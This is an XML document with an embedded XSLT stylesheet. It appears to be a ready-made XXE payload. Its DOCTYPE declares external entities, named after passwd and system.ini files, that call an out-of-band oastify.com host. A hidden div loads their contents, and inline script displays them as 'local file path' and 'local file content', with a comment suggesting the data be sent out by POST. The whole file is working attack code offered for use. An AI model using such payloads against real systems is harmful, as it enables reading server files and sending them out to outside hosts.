<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="?#"?>
<!DOCTYPE div [
  <!ENTITY passwd_p        "https://fudrndkf5bo9pk80idzbu2hzaqgh49uxj.oastify.com/1">
  <!ENTITY passwd_c SYSTEM "https://fudrndkf5bo9pk80idzbu2hzaqgh49uxj.oastify.com/2">
  <!ENTITY sysini_p        "https://fudrndkf5bo9pk80idzbu2hzaqgh49uxj.oastify.com/3">
  <!ENTITY sysini_c SYSTEM "https://fudrndkf5bo9pk80idzbu2hzaqgh49uxj.oastify.com/4">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('')"/>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <div style="display:none">
        <p class="&passwd_p;">&passwd_c;</p>
        <p class="&sysini_p;">&sysini_c;</p>
      </div>
      <div style="width:40rem" id="r" />
      <script>
        document.querySelector('#r').innerHTML = `
remote web url:    &lt;textarea style="width:100%;height:1rem">${location.href}&lt;/textarea>&lt;br/>&lt;br/>`;
        document.querySelectorAll('p').forEach(p => {
          //You can send p.innerHTML by POST.
          document.querySelector('#r').innerHTML += `
local file path:   &lt;textarea style="width:100%;height:1rem">${ p.className }&lt;/textarea>&lt;br/>
local file content:&lt;textarea style="width:100%;height:6rem">${ p.innerHTML }&lt;/textarea>&lt;br/>&lt;br/>`;
        });
      </script>
    </body>
  </xsl:template>
</xsl:stylesheet>